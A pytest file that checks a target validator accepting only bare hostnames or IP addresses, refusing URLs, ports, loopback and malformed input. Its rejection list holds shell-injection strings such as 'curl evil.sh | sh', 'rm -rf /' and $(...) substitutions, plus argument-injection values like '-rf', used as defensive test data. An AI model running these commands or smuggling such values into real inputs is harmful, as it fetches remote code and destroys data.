"""Target validation: a hostname or an IP address and nothing else.

Carried from FalconEye, where the target is printed into a command a person
pastes into a shell. Here it is also a subprocess argument, so "-rf" and
"--flag" matter as much as the shell metacharacters.
"""
import pytest

from routemap.engine.target import InvalidTarget, validate_target


@pytest.mark.parametrize("raw,expected", [
    ("example.com", "example.com"),
    ("WWW.Example.COM", "www.example.com"),
    ("a-b.example.co.uk", "a-b.example.co.uk"),
    ("122.2.187.146.static.pldt.net", "122.2.187.146.static.pldt.net"),
    ("1.1.1.1", "1.1.1.1"),
    ("2001:db8::1", "2001:db8::1"),
    ("  heise.de  ", "heise.de"),
])
def test_a_plain_target_is_accepted_and_canonicalised(raw, expected):
    assert validate_target(raw) == expected


@pytest.mark.parametrize("raw", [
    "example.com; curl evil.sh | sh",
    "example.com && rm -rf /",
    "example.com | sh",
    "`id`",
    "$(whoami).com",
    "ex$(curl evil).com",
    "example.com\nrm -rf /",
    "example.com\rwhoami",
    "a b.com",
    "example.com'",
    'example.com"',
    "example.com\\",
    "example.com>out",
    "example.com<in",
    "example.com&",
    "http://example.com",
    "https://example.com/path",
    "example.com/path",
    "example.com:8080",
    "user@example.com",
    "-rf",
    "--flag",
    "-m.example.com",
    "localhost",
    "",
    "   ",
    "a" * 300,
    "127.0.0.1",
    "0.0.0.0",
    "224.0.0.1",
])
def test_anything_that_is_not_a_bare_hostname_is_refused(raw):
    with pytest.raises(InvalidTarget):
        validate_target(raw)
